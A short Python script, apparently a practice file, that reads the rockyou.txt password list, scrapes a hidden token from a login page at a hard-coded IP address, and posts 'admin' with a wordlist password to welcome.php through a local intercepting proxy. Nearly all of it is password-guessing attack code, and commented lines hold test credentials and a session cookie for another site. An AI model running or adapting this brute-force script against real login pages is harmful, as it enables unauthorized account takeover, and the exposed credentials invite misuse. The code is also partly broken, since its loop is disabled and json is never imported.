
import urllib
import re
from bs4 import BeautifulSoup
from distutils.filelist import findall

import requests

f = open("C:/Users/Elliot/Desktop/python_req_crack/rockyou.txt","r")

host = "http://119.29.175.97/c/hdyzma/"




#req_param = '{"Cookie":"PHPSESSID=itv707dn8bvchtth9omug49eg2"}'
#res = s.post('http://test.e.fanxiaojian.cn/metis-in-web/auth/login', json=json.loads(req_param))



s = requests.session()
# req_param = '{"belongId": "300001312","userName": "alitestss003","password":"pxkj88","captcha":"pxpx","captchaKey":"59675w1v8kdbpxv"}'
# res = s.post('http://test.e.fanxiaojian.cn/metis-in-web/auth/login', json=json.loads(req_param))
# # res1 = s.get("http://test.e.fanxiaojian.cn/eos--web/analysis/briefing")

# page = urllib.request.urlopen(host)
contents = s.get(host,proxies={'http': 'http://127.0.0.1:8080'}).content
soup = BeautifulSoup(contents, "html.parser")
# soup的用法
token = soup.find('input', style='display:none')['value']

print(token)

get = f.readline()
#for line in f.readlines():



#这里用法 是  find后面一个参数是标签，然后找到特殊的字符‘style=none’，最后获取其中的value值


url = host+'welcome.php'
d = {'name': 'admin','password':get,'token':token }
r = s.post(url, data=d,proxies={'http': 'http://127.0.0.1:8080'})
r.encoding = 'UTF-8'
print(r.text)